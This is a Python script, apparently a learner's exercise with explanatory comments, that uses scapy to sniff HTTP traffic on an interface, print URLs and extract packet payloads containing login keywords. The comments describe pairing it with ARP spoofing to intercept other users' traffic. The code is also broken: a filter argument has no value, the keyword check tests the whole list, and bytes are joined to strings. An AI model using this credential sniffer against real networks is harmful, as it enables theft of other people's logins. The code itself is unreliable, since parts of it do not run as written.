#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
# scapy.sniff(iface=[interface],prn=[call back function])
# interface to sniff data from that interface for test use your own browser with that interface for internet access
def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet,filter=)
    # store is false means dont store in computer memory
    # filter arg to filter using bpf ie berqueli packet filter syntax ,value can be udp for packet send over udp
    # udp for send packet like video audio play phone calls and such,value=arp for arp packet,tcp fro tcp packet
    # can also filter based on port eg value=port 21 for ftp packet.or port 60 for web server
    # but we need to have username and password from website and filter dont work for http ie web site so installl 
    # so install 3rd party module for sniff http using pip install scapy_http and import
def login_info(packet):
    if packet.haslayer(scapy.Raw):#apply for specific layer you want
            # we sniff data for load field but some website send data in loadfield which is not username and password
            # so check for substring "username" and "password" in that field
            load=packet[scapy.Raw].load#apply for specific layer and fieldname you want to capture
            keywords=["username","login","user","password","pass","email"]
            for keyword in keywords:
                if keywords in load:#website may use different substring for username and password so check all
                    return load
                    # break#no need break if there is return
                    # print(packet.show())#provide information of different layer so canuse [layer][another layer] to filter only post for passwort and usname
                    # gives all traffic or data flowing through interface so filter this
                    # you may pass arg called filter in sniff function

def get_url(packet):
    return packet[http.HTTPRequest].host + packet[http.HTTPRequest].path#to check layer and fieldname use packet.show()
def process_sniffed_packet(packet):
    # packet is the packet we sniffed in sniff function up
    if packet.haslayer(http.HTTPRequest):#check for http packet only and filter
        # impt use print(packet.show()) and get layers and specific fildname to filter eg layer Raw and fildname load
        url=get_url(packet)
        print("[+] HTTP Request >> " + url)#to captute any url
    if login_info(packet):
        print("\n\n[+] username/password >>> " + login_info(packet) + "\n\n")
         
sniff("eth0")    
# check for the interface which is part of subnet eg eth0 for two virtual machine then you can test with your own 
# browser but to sniff from other run mimf ie arp_spoof.py in background for target become mim then sniff running this program
#print(packet.show()) is very useful command to get appropriate layer and field name use like packet[layer].fieldname for filter only that
#in above program we sniff url and login_info ie post data .made different function for them
# we sniff data at eth0 interface 

